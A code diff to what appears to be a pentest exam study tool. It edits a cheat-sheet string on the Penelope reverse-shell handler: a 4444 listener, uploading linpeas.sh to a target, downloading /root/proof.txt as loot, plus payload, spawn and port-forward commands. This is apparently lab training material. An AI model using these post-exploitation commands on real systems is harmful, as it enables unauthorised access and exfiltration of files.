@@ -763,8 +763,8 @@ penelope -O -c <target> -p 4444
 # MENU
 sessions
 interact 1
-upload /home/kali/linpeas.sh /tmp/linpeas.sh
-download /root/proof.txt /home/kali/exam/loot/proof.txt
+upload /home/kali/linpeas.sh -o /tmp
+download /root/proof.txt -o /home/kali/exam/loot
 upgrade
 spawn
 payloads
@@ -772,7 +772,9 @@ listeners
 portfwd
 kill 1
 help upload
-# payloads prints a callback aimed at the listener you opened. Copy that line.
+# -o is the folder. Penelope keeps the file's own name.
+# payloads asks for the target OS. The desk answers 1 (Linux) when that question appears.
+# One listener, so 1 is the OS. A second listener asks for an ID first. Type that ID, then 1.
 # portfwd is one port through this session. A subnet is still the Tunneling tab.`,
     alive: "F12 shows the menu, sessions lists the host, and download writes proof.txt on Kali.",
     dead: "upload: command not found. You are still in the target shell. F12, then upload. Or nothing arrived: the payload used 443 and Penelope is still on 4444.",
